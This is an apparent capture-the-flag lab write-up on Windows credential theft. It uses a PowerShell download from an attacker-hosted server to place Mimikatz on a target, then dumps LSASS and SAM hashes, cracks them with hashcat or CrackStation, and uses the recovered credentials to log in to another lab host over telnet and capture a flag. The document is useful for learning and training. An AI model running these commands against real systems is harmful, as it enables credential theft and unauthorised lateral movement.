


# f9038f

## HASH CRACKING

0. Download the .exe file of Mimikatz: https://github.com/ParrotSec/mimikatz

1. Set up a Python server running in the directory you have the mimikatz.exe, ensure it is the one with 64 bits.

2. Upload it to the target after entering to powershell:

Invoke-WebRequest -Uri http://192.168.0.4:80/mimikatz.exe -OutFile C:\tools\mimikatz\mimikatz.exe

Remove-Item -Path "C:\tools\mimikatz.exe"

3. mimikatz moment:
	log
	privilege::debug
	sekurlsa::logonpasswords // dumping LSASS passwords
	extraction of sam hashes
	token::elevate
	lsadump::sam // dumping sam (security account manager) hashed it stores passwords of local accounts

4. Crack some of the hashed that has been obtained from the previous command with hashcat, the input should only be the hash:
	hashcat -m 1000 -a 0 -o cracked_sam.txt sam.txt pass.txt
	Hashcat actually did not work for me and I ended up using https://crackstation.net/
	
5. After trying some of them I got this interesting credentials:
	richard_gill:velvety
	
## LATERAL MOVEMENT
6. The passwords that have be been retrieved can be useful to other machines that we can discover through the target 10.0.3.12. If in the windows terminal you do ipconfig:

	Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : europe-west1-b.c.en2720-2017.internal
   Link-local IPv6 Address . . . . . : fe80::78c9:9662:5446:b39%5
   IPv4 Address. . . . . . . . . . . : 10.0.3.12
   Subnet Mask . . . . . . . . . . . : 255.255.255.255
   IPv4 Address. . . . . . . . . . . : 10.41.227.12
   Subnet Mask . . . . . . . . . . . : 255.255.255.255
   Default Gateway . . . . . . . . . : 10.41.224.1

 One thing I noticed was the DNS domain. 
 	nslookup europe-west1-b.c.en2720-2017.internal
		Server:  en2720-w21-sea-turtle
		Address:  10.0.3.229
	
If you do ping to this server there is connectivity.

It has a telnet service opened, the telnet port is 23:

	└─$ telnet 10.0.3.229 23
	Trying 10.0.3.229...
	Connected to 10.0.3.229.

The credentials found gave me access to the server and I found the flag:

	flag{f9038f2aae9c723fc69b516d4beb4774b2510cfcf2fff7}

	


	
